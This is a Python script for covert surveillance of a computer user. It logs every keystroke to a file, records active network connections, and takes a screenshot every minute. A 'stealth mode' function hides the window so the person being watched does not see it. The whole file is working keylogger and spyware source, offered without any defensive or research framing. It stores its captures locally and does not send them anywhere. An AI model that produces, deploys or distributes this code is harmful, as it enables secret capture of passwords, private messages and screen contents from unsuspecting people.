from pynput.keyboard import Listener
import psutil
import time
from PIL import ImageGrab
import threading
import sys
import os

# Configuration
LOG_DIR = "logs"  # Directory to store logs and screenshots
SCREENSHOT_INTERVAL = 60  # Take a screenshot every 60 seconds
INTERNET_CHECK_INTERVAL = 10  # Check internet activity every 10 seconds

# Create logs directory if it doesn't exist
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

# Keylogger
def on_press(key):
    """
    Logs each keystroke to a file.
    """
    try:
        with open(os.path.join(LOG_DIR, "keylog.txt"), "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(os.path.join(LOG_DIR, "keylog.txt"), "a") as f:
            f.write(f" {key} ")

def start_keylogger():
    """
    Starts the keylogger.
    """
    with Listener(on_press=on_press) as listener:
        listener.join()

# Internet Activity Monitor
def monitor_internet_activity():
    """
    Logs all established internet connections.
    """
    while True:
        connections = psutil.net_connections()
        for conn in connections:
            if conn.status == 'ESTABLISHED' and conn.raddr:
                with open(os.path.join(LOG_DIR, "internet_log.txt"), "a") as f:
                    f.write(f"{time.ctime()} - Connected to {conn.raddr.ip}:{conn.raddr.port}\n")
        time.sleep(INTERNET_CHECK_INTERVAL)

# Screen Recorder
def take_screenshot():
    """
    Takes periodic screenshots and saves them as image files.
    """
    while True:
        timestamp = time.strftime("%Y%m%d-%H%M%S")
        screenshot = ImageGrab.grab()
        screenshot.save(os.path.join(LOG_DIR, f"screenshot_{timestamp}.png"))
        time.sleep(SCREENSHOT_INTERVAL)

# Stealth Mode
def hide_script():
    """
    Hides the script from the user (Windows and Linux support).
    """
    if sys.platform == "win32":
        import win32gui
        import win32con
        win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)
    elif sys.platform == "linux":
        os.system("clear")

# Main Function
def start_logging():
    """
    Starts all logging activities in separate threads.
    """
    # Hide the script
    hide_script()

    # Start keylogger in a separate thread
    keylogger_thread = threading.Thread(target=start_keylogger)
    keylogger_thread.daemon = True  # Daemonize thread to exit when the main program exits

    # Start internet activity monitor in a separate thread
    internet_thread = threading.Thread(target=monitor_internet_activity)
    internet_thread.daemon = True

    # Start screen recording in a separate thread
    screenshot_thread = threading.Thread(target=take_screenshot)
    screenshot_thread.daemon = True

    # Start all threads
    keylogger_thread.start()
    internet_thread.start()
    screenshot_thread.start()

    # Keep the main thread alive
    while True:
        time.sleep(1)

if __name__ == "__main__":
    start_logging()
